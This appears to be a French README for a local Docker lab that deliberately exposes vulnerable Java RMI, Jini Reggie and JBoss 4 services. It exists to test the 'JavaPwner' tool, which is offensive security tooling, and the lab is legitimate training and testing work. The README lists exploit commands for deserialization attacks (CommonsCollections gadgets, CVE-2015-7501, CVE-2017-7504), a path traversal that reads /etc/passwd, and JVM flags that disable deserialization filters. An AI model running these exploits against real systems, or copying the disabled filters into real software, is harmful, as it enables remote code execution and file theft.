# JavaPwner — Lab Environnement Vulnérable

Environnement Docker répliquant des conditions réelles d'applications Java vulnérables.
Conçu pour valider les exploits de JavaPwner en local.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                     Hôte (Kali Linux)                   │
│                                                         │
│  javapwner ──► :1099/1098/1097  ──► [rmi-vuln]         │
│            ──► :4160/4162/8085  ──► [jini-reggie]      │
│            ──► :8080            ──► [jboss4]            │
│            ──► :4444 ──────────────► [jboss4]:1099      │
└─────────────────────────────────────────────────────────┘
```

| Service | Image Base | Java | Port(s) hôte | Vulnérabilités |
|---------|------------|------|---------------|----------------|
| `rmi-vuln` | eclipse-temurin:8 | 8 LTS (JEP290 désactivé) | 1099, 1098, 1097 | DGC dirty() + Registry bind() |
| `jini-reggie` | eclipse-temurin:8 | 8 LTS (JEP290 désactivé) | 4160, 4162, 8085 | JRMP DGC + codebase path traversal |
| `jboss4` | eclipse-temurin:8 | 8 LTS (JEP290 désactivé) | 8080, 4444 | CVE-2015-7501, CVE-2017-7504, JNP DGC |

**JEP290 désactivé** via `-Dsun.rmi.transport.dgcFilter=*` et `-Dsun.rmi.registry.registryFilter=*`
(simule un déploiement réel mal configuré ou une version antérieure à Java 8u121).

**CommonsCollections 3.1** est présent dans les 3 classpath — gadgets CC1/CC3/CC5/CC6 fonctionnels.

---

## Prérequis

```bash
docker --version          # Docker Engine 20.10+
docker compose version    # Docker Compose v2+
java -version             # Pour générer les payloads (ysoserial)
```

Assurez-vous que `YSOSERIAL_PATH` est défini ou passez `--ysoserial <path>` à javapwner :

```bash
export YSOSERIAL_PATH=/chemin/vers/ysoserial-all.jar
```

---

## Démarrage

```bash
cd lab/

# Construire les images et démarrer les services
docker compose up -d --build

# Suivre les logs de démarrage
docker compose logs -f

# Vérifier l'état
docker compose ps
```

> **Note JBoss** : JBoss AS 4.2.3.GA prend ~30–60s pour démarrer complètement.
> Attendre le log `JBoss (MX MicroKernel) [...] Started in` avant de tester.

---

## Tests d'exploitation

### Variables communes

```bash
TARGET=127.0.0.1
GADGET=CommonsCollections6   # Fonctionne sur Java 8, toutes versions
CMD_RMI="touch /tmp/rmi-pwned"
CMD_JINI="touch /tmp/jini-pwned"
CMD_JBOSS="touch /tmp/jboss-pwned"
```

---

### 1. Java RMI (pré-JEP290)

#### Scan & énumération
```bash
javapwner rmi scan -t $TARGET
# Attendu:
#   [+] RMI Registry open on 1099
#   [+] Bound: HelloService, DataService
#   [+] DGC reachable — JEP290: INACTIVE (pre-8u121)
```

#### Exploitation DGC dirty()
```bash
javapwner rmi exploit -t $TARGET \
    --gadget $GADGET \
    --cmd "$CMD_RMI"

# Vérification
docker exec lab-rmi-vuln ls -la /tmp/rmi-pwned
```

#### Exploitation Registry bind()
```bash
javapwner rmi exploit -t $TARGET \
    --gadget $GADGET \
    --cmd "$CMD_RMI" \
    --via registry
```

#### Auto-detect gadget + exploit
```bash
javapwner rmi exploit -t $TARGET --cmd "$CMD_RMI"
# (sans --gadget : détecte automatiquement via spray)
```

#### Enumérer les méthodes d'un objet lié
```bash
javapwner rmi guess -t $TARGET --name HelloService
```

---

### 2. Jini / Apache River Reggie

#### Scan & énumération (port 4160)
```bash
javapwner jini scan -t $TARGET -p 4160
# Attendu:
#   [+] Jini Unicast Discovery v2 confirmed (Reggie)
#   [+] JRMP endpoint: 127.0.0.1:4162
#   [+] DGC JEP290: INACTIVE
#   [+] Groups: public
```

#### Exploitation JRMP DGC (port 4162 = endpoint Reggie JRMP)
```bash
javapwner jini exploit -t $TARGET -p 4162 \
    --gadget $GADGET \
    --cmd "$CMD_JINI"

# Vérification
docker exec lab-jini-reggie ls -la /tmp/jini-pwned
```

#### Codebase path traversal (lecture de fichiers)
```bash
# Lecture directe avec URL connue
javapwner jini read-file -t $TARGET -p 4160 \
    --codebase-url "http://127.0.0.1:8085/" \
    --path /etc/passwd

# Auto-détection de l'URL codebase depuis la réponse Unicast Discovery
javapwner jini read-file -t $TARGET -p 4160 \
    --path /etc/hostname
```

#### Scan multicast (LAN)
```bash
javapwner jini multicast --wait 3
```

---

### 3. JBoss AS 4.2.3.GA

#### Scan & fingerprint (port 8080)
```bash
javapwner jboss scan -t $TARGET -p 8080
# Attendu:
#   [+] JBoss / WildFly detected
#   [+] FOUND: http://127.0.0.1:8080/invoker/JMXInvokerServlet [CVE-2015-7501]
#   [+] FOUND: http://127.0.0.1:8080/invoker/EJBInvokerServlet [CVE-2017-7504]
```

#### Exploitation CVE-2015-7501 — JMXInvokerServlet
```bash
javapwner jboss exploit -t $TARGET -p 8080 \
    --gadget $GADGET \
    --cmd "$CMD_JBOSS" \
    --path /invoker/JMXInvokerServlet

# Vérification
docker exec lab-jboss4 ls -la /tmp/jboss-pwned
```

#### Exploitation CVE-2017-7504 — EJBInvokerServlet
```bash
javapwner jboss exploit -t $TARGET -p 8080 \
    --gadget $GADGET \
    --cmd "$CMD_JBOSS" \
    --path /invoker/EJBInvokerServlet
```

#### Auto-détection du path + exploit
```bash
javapwner jboss exploit -t $TARGET -p 8080 \
    --gadget $GADGET \
    --cmd "$CMD_JBOSS"
# (sans --path : tente JMXInvokerServlet, EJBInvokerServlet, readonly)
```

#### Scan JNP (port 4444 = JBoss JNP interne 1099)
```bash
javapwner jboss jnp-scan -t $TARGET
# Port 4444 par défaut — correspond au mapping docker-compose (4444→1099)
```

#### Exploitation JNP DGC dirty()
```bash
javapwner jboss jnp-exploit -t $TARGET \
    --gadget $GADGET \
    --cmd "$CMD_JBOSS"
# Port 4444 par défaut
```

---

## Vérification complète (script)

```bash
#!/bin/bash
# verify-exploits.sh — vérifie que tous les exploits réussissent

TARGET=127.0.0.1
GADGET=CommonsCollections6

echo "=== RMI ==="
javapwner rmi exploit -t $TARGET --gadget $GADGET --cmd "touch /tmp/rmi-pwned"
docker exec lab-rmi-vuln test -f /tmp/rmi-pwned && echo "[PASS] RMI" || echo "[FAIL] RMI"

echo "=== Jini ==="
javapwner jini exploit -t $TARGET -p 4162 --gadget $GADGET --cmd "touch /tmp/jini-pwned"
docker exec lab-jini-reggie test -f /tmp/jini-pwned && echo "[PASS] Jini" || echo "[FAIL] Jini"

echo "=== JBoss HTTP ==="
javapwner jboss exploit -t $TARGET -p 8080 --gadget $GADGET --cmd "touch /tmp/jboss-pwned"
docker exec lab-jboss4 test -f /tmp/jboss-pwned && echo "[PASS] JBoss HTTP" || echo "[FAIL] JBoss HTTP"

echo "=== JBoss JNP ==="
javapwner jboss jnp-exploit -t $TARGET --gadget $GADGET --cmd "touch /tmp/jboss-jnp-pwned"
docker exec lab-jboss4 test -f /tmp/jboss-jnp-pwned && echo "[PASS] JBoss JNP" || echo "[FAIL] JBoss JNP"
```

---

## Nettoyage

```bash
# Arrêter les services
docker compose down

# Supprimer les images et volumes
docker compose down --rmi all -v

# Nettoyer les fichiers créés par les exploits
docker exec lab-rmi-vuln     rm -f /tmp/rmi-pwned
docker exec lab-jini-reggie  rm -f /tmp/jini-pwned
docker exec lab-jboss4       rm -f /tmp/jboss-pwned /tmp/jboss-jnp-pwned
```

---

## Détail des ports

| Port hôte | Protocole | Service | Rôle |
|-----------|-----------|---------|------|
| 1099 | TCP/JRMP | rmi-vuln | RMI Registry — scan + DGC exploit |
| 1098 | TCP/JRMP | rmi-vuln | HelloService objet distant |
| 1097 | TCP/JRMP | rmi-vuln | DataService objet distant |
| 4160 | TCP | jini-reggie | Unicast Discovery — scan |
| 4162 | TCP/JRMP | jini-reggie | Reggie JRMP objet — exploit DGC |
| 8085 | HTTP | jini-reggie | ClassServer — codebase + path traversal |
| 8080 | HTTP | jboss4 | HTTP invoker (CVE-2015-7501 / CVE-2017-7504) |
| 4444 | TCP/JRMP | jboss4 | JNP (container:1099) — jnp-scan/exploit |

---

## Dépannage

**JBoss ne démarre pas** : La première construction télécharge ~95MB.
Si l'URL de téléchargement est invalide, pré-télécharger le ZIP :
```bash
wget "https://download.jboss.org/jbossas/4.2/jbossas-4.2.3.GA/jbossas-4.2.3.GA.zip" \
     -O lab/jboss4/jbossas-4.2.3.GA.zip
# Modifier Dockerfile pour utiliser COPY au lieu de wget
```

**Reggie ne répond pas sur 4162** : Vérifier que `JrmpExporter` est disponible :
```bash
docker exec lab-jini-reggie java -cp /jini/lib/jsk-lib-2.2.3.jar \
    -e "net.jini.jrmp.JrmpExporter.class" 2>&1 || true
docker compose logs jini-reggie | grep -E "(ERROR|JRMP|4162)"
```

**Gadget CommonsCollections échoue sur RMI** : Vérifier les flags JVM.
Les filtres JEP290 sont désactivés via `-Dsun.rmi.transport.dgcFilter=*`. Si le problème persiste,
vérifier que le container utilise bien ces flags : `docker exec lab-rmi-vuln ps aux | grep java`.

**Conflit de port** : Si un service utilise déjà un port, modifier docker-compose.yml.
Par exemple, remplacer `"1099:1099"` par `"11099:1099"` et ajuster les commandes javapwner.
